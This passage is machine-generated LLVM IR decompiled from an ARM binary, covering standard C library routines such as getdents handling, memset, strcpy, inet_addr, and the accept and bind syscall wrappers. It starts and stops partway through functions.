  store i32 %v3_112c4, i32* %r2.global-to-local, align 4
  %v4_112c4 = add i32 %v0_112c4, 8
  %v5_112c4 = inttoptr i32 %v4_112c4 to i32*
  %v6_112c4 = load i32, i32* %v5_112c4, align 4
  %tmp10 = icmp ugt i32 %v6_112c4, %v3_112c4
  br i1 %tmp10, label %dec_label_pc_112f4, label %dec_label_pc_112d0

dec_label_pc_112d0:                               ; preds = %dec_label_pc_112c4
  %v1_112d0 = inttoptr i32 %v0_112c4 to i32*
  %v2_112d0 = load i32, i32* %v1_112d0, align 4
  %v1_112d4 = add i32 %v0_112c4, 12
  %v2_112d4 = inttoptr i32 %v1_112d4 to i32*
  %v3_112d4 = load i32, i32* %v2_112d4, align 4
  store i32 %v3_112d4, i32* %r1.global-to-local, align 4
  %v1_112d8 = add i32 %v0_112c4, 20
  %v2_112d8 = inttoptr i32 %v1_112d8 to i32*
  %v3_112d8 = load i32, i32* %v2_112d8, align 4
  store i32 %v3_112d8, i32* %r2.global-to-local, align 4
  %v4_112dc = call i32 @__getdents(i32 %v2_112d0, i32 %v3_112d4, i32 %v3_112d8, i32 %v6_112c4)
  %tmp9 = icmp slt i32 %v4_112dc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_112ec

.thread:                                          ; preds = %dec_label_pc_112d0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11320

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112d0
  %v1_112ec = load i32, i32* @r5, align 4
  %v2_112ec = add i32 %v1_112ec, 8
  %v3_112ec = inttoptr i32 %v2_112ec to i32*
  store i32 %v4_112dc, i32* %v3_112ec, align 4
  %v0_112f0 = load i32, i32* @r7, align 4
  %v1_112f0 = load i32, i32* @r5, align 4
  %v2_112f0 = add i32 %v1_112f0, 4
  %v3_112f0 = inttoptr i32 %v2_112f0 to i32*
  store i32 %v0_112f0, i32* %v3_112f0, align 4
  %v0_112f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_112f4

dec_label_pc_112f4:                               ; preds = %dec_label_pc_112c4, %dec_label_pc_112ec
  %v1_11304 = phi i32 [ %v0_112c4, %dec_label_pc_112c4 ], [ %v0_112f4.pre, %dec_label_pc_112ec ]
  %v1_112f4 = add i32 %v1_11304, 4
  %v2_112f4 = inttoptr i32 %v1_112f4 to i32*
  %v3_112f4 = load i32, i32* %v2_112f4, align 4
  store i32 %v3_112f4, i32* %r2.global-to-local, align 4
  %v1_112f8 = add i32 %v1_11304, 12
  %v2_112f8 = inttoptr i32 %v1_112f8 to i32*
  %v3_112f8 = load i32, i32* %v2_112f8, align 4
  store i32 %v3_112f8, i32* %r1.global-to-local, align 4
  %v2_112fc = add i32 %v3_112f8, %v3_112f4
  store i32 %v2_112fc, i32* @r4, align 4
  %v1_11300 = add i32 %v2_112fc, 4
  %v2_11300 = inttoptr i32 %v1_11300 to i32*
  %v3_11300 = load i32, i32* %v2_11300, align 4
  %v2_11304 = add i32 %v1_11304, 16
  %v3_11304 = inttoptr i32 %v2_11304 to i32*
  store i32 %v3_11300, i32* %v3_11304, align 4
  %v0_11308 = load i32, i32* @r4, align 4
  %v1_11308 = add i32 %v0_11308, 8
  %v2_11308 = inttoptr i32 %v1_11308 to i16*
  %v3_11308 = load i16, i16* %v2_11308, align 2
  %v4_11308 = zext i16 %v3_11308 to i32
  %v0_1130c = load i32, i32* %r2.global-to-local, align 4
  %v1_1130c = load i32, i32* %r1.global-to-local, align 4
  %v2_1130c = add i32 %v1_1130c, %v0_1130c
  %v3_1130c = inttoptr i32 %v2_1130c to i32*
  %v4_1130c = load i32, i32* %v3_1130c, align 4
  store i32 %v4_1130c, i32* %r1.global-to-local, align 4
  %v2_11310 = add i32 %v0_1130c, %v4_11308
  %v2_11314 = icmp eq i32 %v4_1130c, 0
  %v1_11318 = load i32, i32* @r5, align 4
  %v2_11318 = add i32 %v1_11318, 4
  %v3_11318 = inttoptr i32 %v2_11318 to i32*
  store i32 %v2_11310, i32* %v3_11318, align 4
  br i1 %v2_11314, label %dec_label_pc_112c4, label %dec_label_pc_11320

dec_label_pc_11320:                               ; preds = %dec_label_pc_112f4, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1132c = load i32, i32* @r6, align 4
  %v2_1132c = add i32 %v0_1132c, 44
  %v3_1132c = inttoptr i32 %v2_1132c to i32*
  %v4_1132c = load i32, i32* %v3_1132c, align 4
  call void @__pseudo_branch(i32 %v4_1132c)
  %v0_11338 = load i32, i32* @r4, align 4
  store i32 %v3_11274, i32* @r4, align 4
  store i32 %v6_11274, i32* @r5, align 4
  store i32 %v9_11274, i32* @r6, align 4
  store i32 %v12_11274, i32* @r7, align 4
  store i32 %v15_11274, i32* @lr, align 4
  ret i32 %v0_11338

; uselistorder directives
  uselistorder i32 %v1_11304, { 0, 2, 1 }
  uselistorder i32 %v6_112c4, { 1, 0 }
  uselistorder i32 %v0_112c4, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_112f4, { 1, 0 }
}

define i32 @function_1134c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1134c:
  %v0_1134c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1134c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1134c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1134c, %bb
  %v4_11358 = phi i32 [ %arg1, %dec_label_pc_1134c ], [ 0, %bb ]
  ret i32 %v4_11358

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_1135c = load i32, i32* @lr, align 4
  %v0_11364 = call i32 @__aeabi_read_tp()
  %v3_11368 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11368 = sext i16 %v3_11368 to i32
  %v2_1136c = add i32 %v4_11368, %v0_11364
  store i32 %v0_1135c, i32* @lr, align 4
  ret i32 %v2_1136c
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11380 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11380, i32* @r0, align 4
  %v1_11388 = call i32 @times(i32 %v2_11380)
  %v2_1138c = load i32, i32* %stack_var_-24, align 4
  %v2_11390 = add i32 %v2_1138c, %tmp
  %v2_11398 = mul i32 %v2_11390, 10000
  %v1_1139c = and i32 %v2_11398, 2147483632
  ret i32 %v1_1139c

; uselistorder directives
  uselistorder i32 %v2_11380, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_113b0 = call i32 @_memcpy()
  ret i32 %v0_113b0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_113c0 = call i32 @_memcpy()
  ret i32 %v0_113c0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_113d4 = icmp eq i32 %arg3, 8
  store i1 %v8_113d4, i1* %cpsr_z.global-to-local, align 1
  %v5_113d8 = icmp slt i32 %arg3, 8
  br i1 %v5_113d8, label %dec_label_pc_11438, label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %entry
  %v4_113dc = mul i32 %arg2, 256
  %v5_113dc = or i32 %v4_113dc, %arg2
  %v4_113e0 = mul i32 %v5_113dc, 65536
  %v5_113e0 = or i32 %v4_113e0, %v5_113dc
  store i32 %v5_113e0, i32* @r1, align 4
  %v1_113e457 = urem i32 %tmp, 4
  %v2_113e458 = icmp eq i32 %v1_113e457, 0
  store i1 %v2_113e458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_113e458, label %dec_label_pc_113f4, label %bb

bb:                                               ; preds = %dec_label_pc_113dc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_113dc ]
  %v3_113e859 = phi i32 [ %v6_113e8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_113dc ]
  %v4_113e8 = inttoptr i32 %v3_113e859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_113e8, align 1
  %v5_113e8 = load i32, i32* @r3, align 4
  %v6_113e8 = add i32 %v5_113e8, 1
  store i32 %v6_113e8, i32* @r3, align 4
  %v0_113ec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_113f8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_113ec.pr, label %dec_label_pc_113f4, label %.thread

.thread:                                          ; preds = %bb
  %v2_113ec = add i32 %v0_113f8.pr.pre, -1
  store i32 %v2_113ec, i32* %r2.global-to-local, align 4
  %v1_113e4 = urem i32 %v6_113e8, 4
  %v2_113e4 = icmp eq i32 %v1_113e4, 0
  store i1 %v2_113e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113e4, label %dec_label_pc_113f4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_113e8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_113e8.pre to i8
  br label %bb

dec_label_pc_113f4:                               ; preds = %.thread, %bb, %dec_label_pc_113dc
  %v0_1140028 = phi i32 [ %tmp, %dec_label_pc_113dc ], [ %v6_113e8, %bb ], [ %v6_113e8, %.thread ]
  %v0_113f8.pr = phi i32 [ %arg3, %dec_label_pc_113dc ], [ %v0_113f8.pr.pre, %bb ], [ %v2_113ec, %.thread ]
  %v0_113f4 = load i32, i32* @r1, align 4
  store i32 %v0_113f4, i32* %ip.global-to-local, align 4
  %v8_113f810 = icmp eq i32 %v0_113f8.pr, 8
  store i1 %v8_113f810, i1* %cpsr_z.global-to-local, align 1
  %v5_113fc11 = icmp slt i32 %v0_113f8.pr, 8
  br i1 %v5_113fc11, label %dec_label_pc_11438, label %dec_label_pc_11400.preheader

dec_label_pc_11400.preheader:                     ; preds = %dec_label_pc_113f4
  %v1_1140046 = inttoptr i32 %v0_1140028 to i32*
  store i32 %v0_113f4, i32* %v1_1140046, align 4
  %v3_1140047 = add i32 %v0_1140028, 4
  %v4_1140048 = inttoptr i32 %v3_1140047 to i32*
  %v5_1140049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1140049, i32* %v4_1140048, align 4
  %v6_1140050 = add i32 %v0_1140028, 8
  store i32 %v6_1140050, i32* @r3, align 4
  %v0_1140451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1140452 = add i32 %v0_1140451, -8
  store i32 %v1_1140452, i32* %r2.global-to-local, align 4
  %v5_1140c53 = icmp slt i32 %v1_1140452, 8
  br i1 %v5_1140c53, label %dec_label_pc_11400.dec_label_pc_11438.loopexit_crit_edge, label %dec_label_pc_11410

dec_label_pc_11410:                               ; preds = %dec_label_pc_11400.preheader, %dec_label_pc_113f8.dec_label_pc_11400_crit_edge
  %v6_1140055 = phi i32 [ %v6_11400, %dec_label_pc_113f8.dec_label_pc_11400_crit_edge ], [ %v6_1140050, %dec_label_pc_11400.preheader ]
  %v0_1140054 = phi i32 [ %v12_1142c, %dec_label_pc_113f8.dec_label_pc_11400_crit_edge ], [ %v0_1140028, %dec_label_pc_11400.preheader ]
  %v1_11410 = inttoptr i32 %v6_1140055 to i32*
  %v2_11410 = load i32, i32* @r1, align 4
  store i32 %v2_11410, i32* %v1_11410, align 4
  %v3_11410 = add i32 %v0_1140054, 12
  %v4_11410 = inttoptr i32 %v3_11410 to i32*
  %v5_11410 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11410, i32* %v4_11410, align 4
  %v6_11410 = add i32 %v0_1140054, 16
  store i32 %v6_11410, i32* @r3, align 4
  %v0_11414 = load i32, i32* %r2.global-to-local, align 4
  %v1_11414 = add i32 %v0_11414, -8
  store i32 %v1_11414, i32* %r2.global-to-local, align 4
  %v5_1141c = icmp slt i32 %v1_11414, 8
  br i1 %v5_1141c, label %dec_label_pc_11410.dec_label_pc_11438.loopexit_crit_edge, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11410
  %v1_11420 = inttoptr i32 %v6_11410 to i32*
  %v2_11420 = load i32, i32* @r1, align 4
  store i32 %v2_11420, i32* %v1_11420, align 4
  %v3_11420 = add i32 %v0_1140054, 20
  %v4_11420 = inttoptr i32 %v3_11420 to i32*
  %v5_11420 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11420, i32* %v4_11420, align 4
  %v6_11420 = add i32 %v0_1140054, 24
  store i32 %v6_11420, i32* @r3, align 4
  %v0_11424 = load i32, i32* %r2.global-to-local, align 4
  %v1_11424 = add i32 %v0_11424, -8
  store i32 %v1_11424, i32* %r2.global-to-local, align 4
  %v5_1142c = icmp slt i32 %v1_11424, 8
  br i1 %v5_1142c, label %dec_label_pc_11420.dec_label_pc_11438.loopexit_crit_edge, label %dec_label_pc_113f8

dec_label_pc_113f8:                               ; preds = %dec_label_pc_11420
  %v7_1142c = inttoptr i32 %v6_11420 to i32*
  %v8_1142c = load i32, i32* @r1, align 4
  store i32 %v8_1142c, i32* %v7_1142c, align 4
  %v9_1142c = add i32 %v0_1140054, 28
  %v10_1142c = inttoptr i32 %v9_1142c to i32*
  %v11_1142c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1142c, i32* %v10_1142c, align 4
  %v12_1142c = add i32 %v0_1140054, 32
  store i32 %v12_1142c, i32* @r3, align 4
  %v6_11430 = load i32, i32* %r2.global-to-local, align 4
  %v7_11430 = add i32 %v6_11430, -8
  store i32 %v7_11430, i32* %r2.global-to-local, align 4
  %v5_113fc = icmp slt i32 %v7_11430, 8
  br i1 %v5_113fc, label %dec_label_pc_113f8.dec_label_pc_11438.loopexit_crit_edge, label %dec_label_pc_113f8.dec_label_pc_11400_crit_edge

dec_label_pc_113f8.dec_label_pc_11400_crit_edge:  ; preds = %dec_label_pc_113f8
  %v2_11400.pre = load i32, i32* @r1, align 4
  %v1_11400 = inttoptr i32 %v12_1142c to i32*
  store i32 %v2_11400.pre, i32* %v1_11400, align 4
  %v3_11400 = add i32 %v0_1140054, 36
  %v4_11400 = inttoptr i32 %v3_11400 to i32*
  %v5_11400 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11400, i32* %v4_11400, align 4
  %v6_11400 = add i32 %v0_1140054, 40
  store i32 %v6_11400, i32* @r3, align 4
  %v0_11404 = load i32, i32* %r2.global-to-local, align 4
  %v1_11404 = add i32 %v0_11404, -8
  store i32 %v1_11404, i32* %r2.global-to-local, align 4
  %v5_1140c = icmp slt i32 %v1_11404, 8
  br i1 %v5_1140c, label %dec_label_pc_11400.dec_label_pc_11438.loopexit_crit_edge, label %dec_label_pc_11410

dec_label_pc_113f8.dec_label_pc_11438.loopexit_crit_edge: ; preds = %dec_label_pc_113f8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11438

dec_label_pc_11400.dec_label_pc_11438.loopexit_crit_edge: ; preds = %dec_label_pc_113f8.dec_label_pc_11400_crit_edge, %dec_label_pc_11400.preheader
  %v1_11404.lcssa = phi i32 [ %v1_1140452, %dec_label_pc_11400.preheader ], [ %v1_11404, %dec_label_pc_113f8.dec_label_pc_11400_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11438

dec_label_pc_11410.dec_label_pc_11438.loopexit_crit_edge: ; preds = %dec_label_pc_11410
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11438

dec_label_pc_11420.dec_label_pc_11438.loopexit_crit_edge: ; preds = %dec_label_pc_11420
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %dec_label_pc_113f4, %dec_label_pc_113f8.dec_label_pc_11438.loopexit_crit_edge, %dec_label_pc_11400.dec_label_pc_11438.loopexit_crit_edge, %dec_label_pc_11410.dec_label_pc_11438.loopexit_crit_edge, %dec_label_pc_11420.dec_label_pc_11438.loopexit_crit_edge, %entry
  %v0_11440 = phi i32 [ %arg3, %entry ], [ %v1_11424, %dec_label_pc_11420.dec_label_pc_11438.loopexit_crit_edge ], [ %v1_11414, %dec_label_pc_11410.dec_label_pc_11438.loopexit_crit_edge ], [ %v1_11404.lcssa, %dec_label_pc_11400.dec_label_pc_11438.loopexit_crit_edge ], [ %v7_11430, %dec_label_pc_113f8.dec_label_pc_11438.loopexit_crit_edge ], [ %v0_113f8.pr, %dec_label_pc_113f4 ]
  %v2_11438 = icmp eq i32 %v0_11440, 0
  store i1 %v2_11438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11438, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11438
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11438
  %v1_11440 = sub i32 7, %v0_11440
  store i32 %v1_11440, i32* %r2.global-to-local, align 4
  %v3_11444 = mul i32 %v1_11440, 4
  %v4_11444 = add i32 %v3_11444, ptrtoint (i32* @global_var_1144c.394 to i32)
  call void @__pseudo_branch(i32 %v4_11444)
  %v0_1144c = load i32, i32* @r1, align 4
  %v1_1144c = trunc i32 %v0_1144c to i8
  %v2_1144c = load i32, i32* @r3, align 4
  %v3_1144c = inttoptr i32 %v2_1144c to i8*
  store i8 %v1_1144c, i8* %v3_1144c, align 1
  %v4_1144c = load i32, i32* @r3, align 4
  %v5_1144c = add i32 %v4_1144c, 1
  store i32 %v5_1144c, i32* %r3.global-to-local, align 4
  %v0_11450 = load i32, i32* @r1, align 4
  %v1_11450 = trunc i32 %v0_11450 to i8
  %v3_11450 = inttoptr i32 %v5_1144c to i8*
  store i8 %v1_11450, i8* %v3_11450, align 1
  %v4_11450 = load i32, i32* %r3.global-to-local, align 4
  %v5_11450 = add i32 %v4_11450, 1
  store i32 %v5_11450, i32* %r3.global-to-local, align 4
  %v0_11454 = load i32, i32* @r1, align 4
  %v1_11454 = trunc i32 %v0_11454 to i8
  %v3_11454 = inttoptr i32 %v5_11450 to i8*
  store i8 %v1_11454, i8* %v3_11454, align 1
  %v4_11454 = load i32, i32* %r3.global-to-local, align 4
  %v5_11454 = add i32 %v4_11454, 1
  store i32 %v5_11454, i32* %r3.global-to-local, align 4
  %v0_11458 = load i32, i32* @r1, align 4
  %v1_11458 = trunc i32 %v0_11458 to i8
  %v3_11458 = inttoptr i32 %v5_11454 to i8*
  store i8 %v1_11458, i8* %v3_11458, align 1
  %v4_11458 = load i32, i32* %r3.global-to-local, align 4
  %v5_11458 = add i32 %v4_11458, 1
  store i32 %v5_11458, i32* %r3.global-to-local, align 4
  %v0_1145c = load i32, i32* @r1, align 4
  %v1_1145c = trunc i32 %v0_1145c to i8
  %v3_1145c = inttoptr i32 %v5_11458 to i8*
  store i8 %v1_1145c, i8* %v3_1145c, align 1
  %v4_1145c = load i32, i32* %r3.global-to-local, align 4
  %v5_1145c = add i32 %v4_1145c, 1
  store i32 %v5_1145c, i32* %r3.global-to-local, align 4
  %v0_11460 = load i32, i32* @r1, align 4
  %v1_11460 = trunc i32 %v0_11460 to i8
  %v3_11460 = inttoptr i32 %v5_1145c to i8*
  store i8 %v1_11460, i8* %v3_11460, align 1
  %v4_11460 = load i32, i32* %r3.global-to-local, align 4
  %v5_11460 = add i32 %v4_11460, 1
  store i32 %v5_11460, i32* %r3.global-to-local, align 4
  %v0_11464 = load i32, i32* @r1, align 4
  %v1_11464 = trunc i32 %v0_11464 to i8
  %v3_11464 = inttoptr i32 %v5_11460 to i8*
  store i8 %v1_11464, i8* %v3_11464, align 1
  %v4_11464 = load i32, i32* %r3.global-to-local, align 4
  %v5_11464 = add i32 %v4_11464, 1
  store i32 %v5_11464, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11400, { 1, 0 }
  uselistorder i32 %v12_1142c, { 1, 2, 0 }
  uselistorder i32 %v0_1140054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_113f8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_113e8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_113dc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11438, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11410, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_114801 = load i32, i32* @r1, align 4
  %v1_114802 = inttoptr i32 %v0_114801 to i8*
  %v2_114803 = load i8, i8* %v1_114802, align 1
  %v2_114845 = icmp eq i8 %v2_114803, 0
  store i1 %v2_114845, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_114803, i8* %arg1, align 1
  br i1 %v2_114845, label %dec_label_pc_11490, label %dec_label_pc_11478

dec_label_pc_11478:                               ; preds = %entry, %dec_label_pc_11478
  %v0_11478 = load i32, i32* @r1, align 4
  %v1_11478 = add i32 %v0_11478, 1
  store i32 %v1_11478, i32* @r1, align 4
  %v0_1147c = load i32, i32* %r2.global-to-local, align 4
  %v1_1147c = add i32 %v0_1147c, 1
  store i32 %v1_1147c, i32* %r2.global-to-local, align 4
  %v1_11480 = inttoptr i32 %v1_11478 to i8*
  %v2_11480 = load i8, i8* %v1_11480, align 1
  %v2_11484 = icmp eq i8 %v2_11480, 0
  store i1 %v2_11484, i1* %cpsr_z.global-to-local, align 1
  %v3_11488 = inttoptr i32 %v1_1147c to i8*
  store i8 %v2_11480, i8* %v3_11488, align 1
  %v0_1148c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1148c, label %dec_label_pc_11490, label %dec_label_pc_11478

dec_label_pc_11490:                               ; preds = %dec_label_pc_11478, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_11478, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1149c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1149c, i32* @r1, align 4
  %v0_114a0 = call i32 @inet_aton()
  %v2_114a4 = icmp eq i32 %v0_114a0, 0
  %v4_114a8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_114a4, i32 -1, i32 %v4_114a8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114bc = load i32, i32* @r7, align 4
  store i32 %v3_114bc, i32* %stack_var_-8, align 4
  %v0_114c8 = load i32, i32* @r0, align 4
  store i32 %v0_114c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114c8, -4095
  br i1 %tmp, label %dec_label_pc_114f0, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %entry
  %v0_114dc = call i32 @__aeabi_read_tp()
  %v3_114e0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_114e0 = sext i16 %v3_114e0 to i32
  %v0_114e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_114e4 = sub i32 0, %v0_114e4
  store i32 %v1_114e4, i32* %r2.global-to-local, align 4
  %v3_114e8 = add i32 %v4_114e0, %v0_114dc
  %v4_114e8 = inttoptr i32 %v3_114e8 to i32*
  store i32 %v1_114e4, i32* %v4_114e8, align 4
  %v2_114f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114f0

dec_label_pc_114f0:                               ; preds = %entry, %dec_label_pc_114d8
  %v1_114f4 = phi i32 [ %v0_114c8, %entry ], [ -1, %dec_label_pc_114d8 ]
  %v2_114f0 = phi i32 [ %v3_114bc, %entry ], [ %v2_114f0.pre, %dec_label_pc_114d8 ]
  store i32 %v2_114f0, i32* @r7, align 4
  ret i32 %v1_114f4

; uselistorder directives
  uselistorder i32 %v0_114c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114f0, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_114f8:
  %v0_114f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_114f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_114f8
  %v2_114f8 = load i32, i32* @sp, align 4
  %v8_114f8 = shl i32 %v2_114f8, %arg2
  %v9_114f8 = and i32 %v8_114f8, %arg1
  %v3_114fc = load i32, i32* @r5, align 4
  %v8_114fc = ashr i32 %v9_114f8, %v3_114fc
  %v9_114fc = and i32 %v8_114fc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_114f8, %bb
  %v10_114fc = phi i32 [ %arg1, %dec_label_pc_114f8 ], [ %v9_114fc, %bb ]
  ret i32 %v10_114fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_11504 = load i32, i32* @r4, align 4
  %v9_11504 = load i32, i32* @r6, align 4
  %v12_11504 = load i32, i32* @r7, align 4
  %v4_11510 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_11514 = icmp eq i32 %v4_11510, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_11514, label %dec_label_pc_1152c, label %entry.dec_label_pc_11538_crit_edge

entry.dec_label_pc_11538_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11538

dec_label_pc_1152c:                               ; preds = %entry
  store i32 %v3_11504, i32* @r4, align 4
  store i32 %v9_11504, i32* @r6, align 4
  store i32 %v12_11504, i32* @r7, align 4
  %v0_11534 = call i32 @__sys_accept()
  br label %dec_label_pc_11538

dec_label_pc_11538:                               ; preds = %entry.dec_label_pc_11538_crit_edge, %dec_label_pc_1152c
  %v0_11538 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11538, i32* @r5, align 4
  %v0_11548 = load i32, i32* @r4, align 4
  store i32 %v0_11548, i32* @r0, align 4
  %v0_1154c = call i32 @__sys_accept()
  store i32 %v0_1154c, i32* @r4, align 4
  %v0_11554 = load i32, i32* @r5, align 4
  %v1_11558 = call i32 @__libc_disable_asynccancel(i32 %v0_11554)
  %v0_1155c = load i32, i32* @r4, align 4
  store i32 %v12_11504, i32* @r7, align 4
  ret i32 %v0_1155c

; uselistorder directives
  uselistorder label %dec_label_pc_11538, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11574 = load i32, i32* @r7, align 4
  store i32 %v3_11574, i32* %stack_var_-8, align 4
  %v0_11580 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11580, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11580, -4095
  br i1 %tmp, label %dec_label_pc_115a8, label %dec_label_pc_11590

dec_label_pc_11590:                               ; preds = %entry
  %v0_11594 = call i32 @__aeabi_read_tp()
  %v3_11598 = load i16, i16* @global_var_21a38.351, align 2
  %v4_11598 = sext i16 %v3_11598 to i32
  %v0_1159c = load i32, i32* %r2.global-to-local, align 4
  %v1_1159c = sub i32 0, %v0_1159c
  store i32 %v1_1159c, i32* %r2.global-to-local, align 4
  %v3_115a0 = add i32 %v4_11598, %v0_11594
  %v4_115a0 = inttoptr i32 %v3_115a0 to i32*
  store i32 %v1_1159c, i32* %v4_115a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_115a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_115a8

dec_label_pc_115a8:                               ; preds = %entry, %dec_label_pc_11590
  %v1_115ac = phi i32 [ %v0_11580, %entry ], [ -1, %dec_label_pc_11590 ]
  %v2_115a8 = phi i32 [ %v3_11574, %entry ], [ %v2_115a8.pre, %dec_label_pc_11590 ]
  store i32 %v2_115a8, i32* @r7, align 4
  ret i32 %v1_115ac

; uselistorder directives
  uselistorder i32 %v0_11580, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115a8, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
